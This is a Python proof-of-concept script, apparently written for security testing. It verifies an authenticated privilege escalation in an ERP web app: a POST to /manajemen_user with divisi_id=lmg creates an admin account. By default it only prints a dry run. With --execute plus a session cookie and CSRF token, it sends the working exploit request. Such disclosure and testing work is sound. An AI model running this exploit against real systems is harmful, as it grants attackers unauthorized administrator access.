#!/usr/bin/env python3
"""Dry-run-first verifier for authenticated admin privilege escalation."""

import argparse
import urllib.parse
import urllib.request


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("base_url")
    parser.add_argument("--cookie", help="Authenticated Laravel session cookie header value")
    parser.add_argument("--csrf", help="CSRF token from the authenticated session")
    parser.add_argument("--email", default="security-poc-admin@example.invalid")
    parser.add_argument("--execute", action="store_true", help="CREATE an admin account; use only on an isolated test DB")
    args = parser.parse_args()

    fields = {
        "_token": args.csrf or "<csrf-token>",
        "name": "Security PoC Admin",
        "email": args.email,
        "password": "Security-PoC-Only-2026!",
        "divisi_id": "lmg",
        "jabatan": "ceo",
    }
    target = args.base_url.rstrip("/") + "/manajemen_user"
    print("1. Attacker position: any authenticated, non-admin ERP user.")
    print(f"2. Target: POST {target}")
    print("3. Trigger: divisi_id=lmg causes UserController::store() to persist isAdmin=true.")
    if not args.execute:
        print("4. DRY RUN: no account was created. Use --execute only against an isolated test database.")
        print("5. Expected secure result: HTTP 403 and no new user row.")
        return 0
    if not args.cookie or not args.csrf:
        parser.error("--execute requires --cookie and --csrf")

    request = urllib.request.Request(
        target,
        data=urllib.parse.urlencode(fields).encode(),
        method="POST",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": args.cookie,
            "Accept": "text/html",
        },
    )
    opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler())
    response = opener.open(request, timeout=10)
    print(f"4. Server returned HTTP {response.status}; verify whether {args.email} was created with isAdmin=true.")
    print("5. Cleanup: delete the PoC account immediately from the isolated test database.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
